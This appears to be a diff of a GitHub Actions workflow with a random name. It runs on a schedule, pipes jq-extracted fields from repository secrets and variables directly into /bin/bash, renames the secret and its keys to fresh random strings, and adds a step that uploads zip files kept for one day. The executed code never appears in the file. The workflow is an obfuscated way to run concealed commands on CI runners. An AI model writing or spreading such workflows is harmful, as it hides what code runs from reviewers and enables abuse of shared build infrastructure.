@@ -1,29 +1,30 @@
 name: jiangqiaochuangguang
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '21 4/6 * * *'
-jobs:  # 8035
+    - cron: '42 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: jiangqiaochuangguang
         env:
-          e9: ${{ secrets.e9 }}
+          oqo218: ${{ secrets.oqo218 }}
         run: |
-          echo $e9 | jq -r .qsnta876 | /bin/bash
-          echo $ud792 | jq -r .pnrhg2 | /bin/bash
-          echo $fvrk62943 | jq -r .am32597 | /bin/bash
-          echo $y6 | jq -r .rv84224 | /bin/bash
-          echo $aschq754 | jq -r .mqv03 | /bin/bash
-          echo $me77 | jq -r .jgte120 | /bin/bash
-          echo $l538 | jq -r .jq5724 | /bin/bash
-          echo $j7423 | jq -r .vkdo8222 | /bin/bash
-          echo $p7 | jq -r .y32194 | /bin/bash
-          echo $ajuq527 | jq -r .wnpgt5 | /bin/bash
-          echo $lbad98813 | jq -r .f7 | /bin/bash
-          echo $oaujj5 | jq -r .ujkq00414 | /bin/bash
+          printf '%s' "$oqo218" | jq -r .un7785 | /bin/bash
+          echo $ltfxo1 | jq -r .q20 | /bin/bash
+          echo $ewkod1563 | jq -r .ih9952 | /bin/bash
+          printf '%s' "$anx3" | jq -r .b21 | /bin/bash
+          printf '%s' "$tdkuf0453" | jq -r .gyxta2217 | /bin/bash
+          echo $lt7 | jq -r .vqm533 | /bin/bash
+          printf '%s' "$f03" | jq -r .w6428 | /bin/bash
+          printf '%s' "$tbfe46" | jq -r .t85215 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 00qHcVIQ
+          path: "*.zip"
+          retention-days: 1
